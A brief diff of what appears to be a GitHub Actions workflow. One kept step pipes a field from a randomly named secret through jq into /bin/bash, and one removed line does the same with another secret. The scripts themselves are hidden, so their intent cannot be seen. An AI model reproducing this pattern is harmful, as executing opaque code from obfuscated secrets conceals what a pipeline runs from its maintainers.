@@ -17,7 +17,6 @@ jobs:
           lwlk0884: ${{ secrets.lwlk0884 }}
         run: |
           printf '%s' "$lwlk0884" | jq -r .pvnpn19792 | /bin/bash
-          printf '%s' "$gtv5095" | jq -r .srkib27712 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
